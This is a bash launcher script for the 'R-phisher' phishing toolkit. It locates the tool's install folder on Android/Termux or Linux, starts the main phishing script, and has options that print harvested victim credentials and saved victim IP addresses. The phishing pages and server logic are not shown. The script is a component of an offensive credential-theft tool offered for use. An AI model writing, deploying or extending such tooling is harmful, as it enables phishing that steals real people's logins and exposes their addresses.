#!/bin/bash

# https://github.com/Raeed-khan/R-phisher

if [[ $(uname -o) == *'Android'* ]]; then
    R_PHISHER_ROOT="/data/data/com.termux/files/usr/opt/r-phisher"
else
    export R_PHISHER_ROOT="/opt/r-phisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
    echo "To run R-phisher type \`r-phisher\` in your cmd"
    echo
    echo "Help:"
    echo " -h | help : Print this menu & Exit"
    echo " -c | auth : View Saved Credentials"
    echo " -i | ip   : View Saved Victim IP"
    echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
    cat "$R_PHISHER_ROOT/auth/usernames.dat" 2> /dev/null || { 
        echo "No Credentials Found !"
        exit 1
    }
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
    cat "$R_PHISHER_ROOT/auth/ip.txt" 2> /dev/null || {
        echo "No Saved IP Found !"
        exit 1
    }
else
    cd "$R_PHISHER_ROOT" || {
        echo "Error: Directory $R_PHISHER_ROOT not found!"
        exit 1
    }
    bash ./R-phisher.sh
fi
